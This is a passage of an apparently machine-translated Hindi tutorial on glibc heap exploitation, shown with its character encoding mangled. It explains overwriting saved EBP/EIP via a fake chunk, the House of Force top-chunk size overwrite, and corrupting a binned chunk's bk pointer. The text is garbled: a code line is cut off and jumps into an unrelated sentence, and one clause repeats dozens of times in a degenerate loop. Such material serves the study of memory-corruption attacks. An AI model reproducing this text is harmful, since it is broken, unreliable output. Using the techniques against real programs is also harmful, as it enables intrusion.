рдЪрд╛рд╣рд┐рдП (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ ptr=EBP рд╣реЛрдиреЗ рдХреЗ рдХрд╛рд░рдг), рдЕрд░реНрдерд╛рдд 8 < ptr-4+48 < av->system\_memред

рдЗрд╕рдХреЗ рд▓рд┐рдП, рдЬрдм рдЕрдЧрд▓реА malloc рдХреЙрд▓ рдХреА рдЬрд╛рдПрдЧреА рдЬрд┐рд╕реЗ рд╣рдордиреЗ рдХрд╣рд╛ рдХрд┐ рд╡рд╣ malloc(40) рд╣реИ, рддреЛ рдЙрд╕реЗ EBP рдХрд╛ рдкрддрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ malloc рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХрд╛ рдирд┐рдпрдВрддреНрд░рдг рд░рдЦ рд╕рдХрддрд╛ рд╣реИ рддреЛ рд╡рд╣ EBP рдФрд░ EIP рджреЛрдиреЛрдВ рдХреЛ рдЙрд╕ рдкрддреЗ рдкрд░ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдЗрд╕рд▓рд┐рдП рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрдм рдЙрд╕реЗ рдореБрдХреНрддрд┐ рдорд┐рд▓рддреА рд╣реИ free() рддреЛ рд╡рд╣ рд╕рдВрджреЗрд╢ рд░рдЦреЗрдЧрд╛ рдХрд┐ рд╕реНрдЯреИрдХ рдХреЗ EBP рдХреЗ рдкрддреЗ рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдЬреЛ рдирдП malloc() рдХреЗ рд▓рд┐рдП рд╕рд╣реА рдЖрдХрд╛рд░ рдХрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рд╡рд╣ рдЙрд╕ рдкрддреЗ рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░реЗрдЧрд╛ред

**The House of Force**

рдЖрд╡рд╢реНрдпрдХ рд╣реИ:

* рдПрдХ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдУрд╡рд░рдлреНрд▓реЛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдУрд╡рд░рдлреНрд▓реЛ
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдЖрдХрд╛рд░ рдХреЗ рд╕рд╛рде malloc() рдХреЙрд▓
* рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде malloc() рдХреЙрд▓

рдкрд╣рд▓реА рдЪреАрдЬ рдЬреЛ рдХреА рдЬрд╛рддреА рд╣реИ рд╡рд╣ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рдмрд╣реБрдд рдмрдбрд╝реЗ рдорд╛рди (0xffffffff) рд╕реЗ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╣реИ, рдЗрд╕ рддрд░рд╣ рдХреЛрдИ рднреА рдкрд░реНрдпрд╛рдкреНрдд рдмрдбрд╝реА рдЖрдХрд╛рд░ рдХреА рдорд╛рдВрдЧ \_int\_malloc() рдореЗрдВ рд╕рдВрдмреЛрдзрд┐рдд рдХреА рдЬрд╛рдПрдЧреА рдмрд┐рдирд╛ рд╣реАрдк рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░ рдХрд┐рдПред

рджреВрд╕рд░реА рдЪреАрдЬ рд╣реИ рдХрд┐ av->top рдХреЛ рдПрдХ рдХрдВрдЯреНрд░реЛрд▓ рдХреЗ рддрд╣рдд рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдкрд░ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрджрд▓рдирд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдЯреИрдХред av->top рдореЗрдВ \&EIP - 8 рдбрд╛рд▓рд╛ рдЬрд╛рдПрдЧрд╛ред

рд╣рдореЗрдВ рдЕрдЯрдХрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдореЛрд░реА рдХреНрд╖реЗрддреНрд░ рдХреА рдУрд░ рдирд┐рд╢рд╛рдирд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП av->top рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛:

victim = av->top;

remainder = chunck\_at\_offset(v
рджреЛ malloc рдХреЛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдП, рддрд╛рдХрд┐ рдкрд╣рд▓реЗ рдкрд░ overflow рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрдм рджреВрд╕рд░рд╛ рдореБрдХреНрдд рдХрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ рдФрд░ рдЙрд╕реЗ рдЙрд╕рдХреЗ bin рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ (рдЕрд░реНрдерд╛рдд рджреВрд╕рд░реЗ рдЯреБрдХрдбрд╝реЗ рдХреЗ рдмрд╛рдж рдПрдХ рдКрдкрд░реА malloc рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реЛ)

рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рджреНрд╡рд╛рд░рд╛ рдЪреБрдиреЗ рдЧрдП рдкрддреЗ рд╡рд╛рд▓реЗ malloc рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

рд▓рдХреНрд╖реНрдп рдпрд╣ рд╣реИ, рдЕрдЧрд░ рд╣рдо рдПрдХ рд╣реАрдк рдХреЛ overflow рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдХреЗ рдиреАрдЪреЗ рдПрдХ рдореБрдХреНрдд рдЯреБрдХрдбрд╝рд╛ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ bin рдореЗрдВ рд╣реИ, рддреЛ рд╣рдо рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЕрдЧрд░ рд╣рдо рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рдмрджрд▓ рджреЗрддреЗ рд╣реИрдВ рдФрд░ рдпрд╣ рдЯреБрдХрдбрд╝рд╛ bin рдХреА рдкрд╣рд▓реА рд╕реВрдЪреА рдореЗрдВ рдЖ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ bin рдХреЛ рдзреЛрдЦрд╛ рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдЙрд╕реЗ рдмрддрд╛рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдХрд┐ рд╕реВрдЪреА рдХрд╛ рдЕрдВрддрд┐рдо рдЯреБрдХрдбрд╝рд╛ (рдЕрдЧрд▓рд╛ рдкреНрд░рджрд╛рди рдХрд░рдиреЗ рд╡рд╛рд▓рд╛) рд╣рдордиреЗ рджрд┐рдЦрд╛рдИ рдЧрдИ рдЭреВрдареА рдкрддреЗ рдкрд░ рд╣реИ (рд╕реНрдЯреИрдХ рдпрд╛ GOT рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП)ред рдЗрд╕рд▓рд┐рдП рдЕрдЧрд░ рдПрдХ рдФрд░ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓реЗ рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХреЛ рдЙрд╕рдореЗрдВ рдЕрдиреБрдорддрд┐ рд╣реИ, рддреЛ рдЙрд╕реЗ рд╡рд╛рдВрдЫрд┐рдд рд╕реНрдерд╛рди рдкрд░ рдПрдХ рдЯреБрдХрдбрд╝рд╛ рдорд┐рд▓реЗрдЧрд╛ рдФрд░ рдЙрд╕рдореЗрдВ рд▓рд┐рдЦ рд╕рдХреЗрдЧрд╛ред

рд╕рдВрд╢реЛрдзрд┐рдд рдЯреБрдХрдбрд╝рд╛ рдореБрдХреНрдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕реЗ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рддрд╛рдХрд┐ рдпрд╣ unsorted bins рд╕реЗ рдмрд╛рд╣рд░ рдирд┐рдХрд▓ рдЬрд╛рдП рдФрд░ рдЙрд╕рдХреЗ bin рдореЗрдВ рдбрд╛рд▓ рджрд┐рдпрд╛ рдЬрд╛рдПред

рдЙрд╕рдХреЗ bin рдореЗрдВ рдПрдХ рдмрд╛рд░ рдкрд╣реБрдВрдЪрдиреЗ рдХреЗ рдмрд╛рдж рдЙрд╕рдХреЗ рдкреНрд╡рд╛рдЗрдВрдЯрд░ bk рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ overflow рдХрд░рдХреЗ рддрд╛рдХрд┐ рд╡рд╣ рд╣рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рджрд┐рд╢рд╛ рджрд┐рдЦрд╛рдПред

рдЗрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП рд╡рд┐рдХрд▓реНрдк рд╣реИрдВ: рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝рд╛ рдХреА рдЖрд░рдХреНрд╖рдг, рд╕рдВрд╢реЛрдзрд┐рдд рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг, рдЗрд╕ рдЯреБрдХрдбрд╝реЗ рдХреЛ рдореБрдХреНрдд рдХрд░рдирд╛, рдЙрд╕рд╕реЗ рдЕрдзрд┐рдХ рдЯреБрдХрдбрд╝рд╛ рдЖрд░рдХреНрд╖рд┐рдд рдХрд░рдирд╛, рдЯреБрдХрдбрд╝рд╛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдирд╛ (рдХрдордЬреЛрд░реА), рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡рд┐рдХрд▓реНрдкрдиреАрдп рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрдХрд╛рд░ рдХреА рддреБрд▓рдирд╛ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрдбрд╝реЗ рдЯреБрдХрдбрд╝реЗ рдХреА рдЖрд░рдХреНрд╖рдг рдХрд░рдирд╛, рд╡
